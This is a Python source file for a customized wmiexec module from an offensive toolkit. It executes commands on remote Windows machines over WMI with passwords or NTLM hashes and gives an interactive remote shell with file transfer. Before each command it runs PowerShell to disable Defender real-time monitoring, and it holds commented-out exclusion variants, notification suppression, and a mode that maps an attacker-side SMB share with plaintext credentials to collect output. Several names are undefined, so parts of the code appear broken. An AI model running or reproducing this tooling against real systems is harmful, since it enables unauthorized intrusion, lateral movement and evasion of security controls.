
# wmiexec runs as the USER
# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A similar approach to smbexec but executing commands through WMI.
# Main advantage here is it runs under the user (has to be Admin) 
# account, not SYSTEM, plus, it doesn't generate noisy messages
# in the event log that smbexec.py does when creating a service.
# Drawback is it needs DCOM, hence, I have to be able to access 
# DCOM ports at the target machine.
#
# Author:
#  beto (@agsolino)
#
# Reference for:
#  DCOM
#
#
#
# Customized by @awsmhacks for CMX


import ntpath, logging
import sys
import os
import cmd

from gevent import sleep
from cmx.helpers.misc import gen_random_string

from cmx import config as cfg
import time

import impacket

OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = './logs/'
DUMMY_SHARE     = 'TMP'
CODEC = sys.stdout.encoding

class WMIEXEC:
    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None):
        self.__target = target
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__outputBuffer = ''
        self.__share_name = share_name
        self.__shell = 'cmd.exe /Q /c '
        self.__pwd = 'C:\\'
        self.__aesKey = None
        self.__doKerberos = False
        self.__retOutput = True

        #This checks to see if we didn't provide the LM Hash
        if hashes is not None:
            if hashes.find(':') != -1:
                self.__lmhash, self.__nthash = hashes.split(':')
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ''

        dialect = smbconnection.getDialect()
        
        if dialect == SMB_DIALECT:
            logging.debug("SMBv1 dialect used")
        elif dialect == SMB2_DIALECT_002:
            logging.debug("SMBv2.0 dialect used")
        elif dialect == SMB2_DIALECT_21:
            logging.debug("SMBv2.1 dialect used")
        else:
            logging.debug("SMBv3.0 dialect used")


        self.__dcom  = impacket.dcerpc.v5.dcomrt.DCOMConnection(self.__target, self.__username, self.__password, self.__domain, self.__lmhash, 
                                      self.__nthash,self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos)
        try:
            iInterface = self.__dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            self.__win32Process,_ = iWbemServices.GetObject('Win32_Process')
        except  (Exception, KeyboardInterrupt) as e:
                   if logging.getLogger().level == logging.DEBUG:
                       import traceback
                       traceback.print_exc()
                   logging.error(str(e))
                   if smbConnection is not None:
                       smbConnection.logoff()


    def execute(self, command, output=False):
        self.__retOutput = output
        if self.__retOutput:
            self.__smbconnection.setTimeout(100000)

        self.execute_handler(command)
        self.__dcom.disconnect()
        return self.__outputBuffer

    def cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.__outputBuffer = ''

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_handler(self, data):
        if self.__retOutput:
            #self.disable_notifications()
            self.disable_defender()
            try:
                self.execute_fileless(data)
            except:
                self.cd('\\')
                self.execute_remote(data)
        else:
            #self.disable_notifications()
            self.disable_defender()
            self.execute_remote(data)


    def execute_remote(self, data):
        self.__output = '\\Windows\\Temp\\' + gen_random_string(6)

        command = self.__shell + data
        if self.__retOutput:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'

        logging.debug('wmi Executing_remote command: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_remote()


    def execute_fileless(self, data):
        self.__output = gen_random_string(6)
        local_ip = self.__smbconnection.getSMBServer().get_socket().getsockname()[0]


        commandData = self.__shell + data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
                                                                         self.__share_name,
                                                                         self.__output)
        #commandData = data + ' 1> \\\\{}\\{}\\{} 2>&1'.format(local_ip, 
        #                                                                 self.__share_name,
        #                                                                 self.__output)
        
        #adding creds gets past systems disallowing guest-auth
        # cmd.exe /Q /c "net use \\10.10.33.200\CAJKY /savecred /p:no /user:agrande User!23 & cmd.exe /Q /c whoami 1> \\10.10.33.200\CAJKY\QYkvxb 2>&1
        command = self.__shell + '"net use * /d /y & '
        command += self.__shell + 'net use \\\\{}\\{} /savecred /p:no /user:{} {} & {} "'.format(local_ip, 
                                                                                                 self.__share_name, 
                                                                                                 self.__username, 
                                                                                                 self.__password, 
                                                                                                 commandData)
        #command += 'net use \\\\{}\\{} /savecred /p:no /user:{} {}"'.format(local_ip, 
        #                                                                                         self.__share_name, 
        #                                                                                         self.__username, 
        #                                                                                         self.__password 
        #                                                                                         )
        
        logging.debug('wmi Executing_fileless command: {}'.format(command))

        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output_fileless()


    def get_output_fileless(self):
        while True:
            try:
                with open((cfg.TMP_PATH / self.__output), 'r') as output:
                    self.output_callback(output.read())
                break
            except IOError:
                sleep(5)

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    sleep(2)
                    pass
                else:
                    #print str(e)
                    pass

        self.__smbconnection.deleteFile(self.__share, self.__output)

    def disable_notifications(self):
        """
        Cant figure out how to make these apply at runtime??
        https://www.tenforums.com/tutorials/105486-enable-disable-notifications-windows-security-windows-10-a.html
        Maybe just stop the notification service?
        """
        command = self.__shell + """"FOR /F %a IN ('REG.EXE QUERY hku 2^>NUL ^| FIND ^"HKEY_USERS^"') DO REG.EXE add ^"%a\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance^" /v ^"Enabled^" /d ^"0^" /t REG_DWORD /F" """

        logging.debug('notifications being disabling using: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        print('            [!] Sleeping while notifications are disabled [!] ')
        time.sleep(4)


    def disable_defender(self):
        command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableRealtimeMonitoring $true;"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".exe""'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionProcess $pid"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionPath $env:temp"'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Add-MpPreference -ExclusionExtension ".ps1""'
        #command = self.__shell + 'powershell.exe -exec bypass -noni -nop -w 1 -C "Set-MpPreference -DisableIOAVProtection 1"'
        logging.debug('wmi Disabling Defender using: ' + command)
        self.__win32Process.Create(command, self.__pwd, None)
        print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
        time.sleep(8)


####################################################################################################
####################################################################################################
#                           Shell Stuff
####################################################################################################
####################################################################################################


    def run(self, addr, dummy):
        
        self.shell = None
        logging.debug('inside wmishell.run')
        
        try:
            self.shell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
            self.shell.cmdloop()

        except  (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        try:
            if self.__smbconnection is not None:
                self.__smbconnection.logoff()
            dcom.disconnect()

        except  (Exception, KeyboardInterrupt) as e:
            logging.debug('Error: {}'.format(e))




class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = str('')
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = str('C:\\')
        self.__noOutput = False
        self.intro = "   .... i'm in \n Type help for extra shell commands"

        logging.debug('inside wmi.RemoteShell.init')

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        logging.debug('inside wmi.RemoteShell.do_shell')
        os.system(s)

    def do_help(self, line):
        print("""
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
""") 

    def do_lcd(self, s):
        if s == '':
            print(os.getcwd())
        else:
            try:
                os.chdir(s)
            except Exception as e:
                logging.error(str(e))

    def do_get(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath) 
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()

        except Exception as e:
            logging.error(str(e))

            if os.path.exists(filename):
                os.remove(filename)



    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = dst_path.replace('/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception as e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        logging.debug('inside wmi.RemoteShell.do_cd')
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print(self.__outputBuffer)
            self.__outputBuffer = ''

        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = (self.__pwd + '>')
            self.__outputBuffer = ''

    def default(self, line):
        logging.debug('inside wmi.RemoteShell.default')
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0: 
                # Something went wrong
                print(self.__outputBuffer)
                self.__outputBuffer = ''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = (self.__pwd + '>')
                self.__outputBuffer = ''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        logging.debug('inside wmi.RemoteShell.get_output')
        
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception as e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        logging.debug('inside wmi.RemoteShell.execute_remote')
        command = self.__shell + data 
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'

        self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        logging.debug('inside wmi.RemoteShell.send_data')
        self.execute_remote(data)
        print(self.__outputBuffer)
        self.__outputBuffer = ''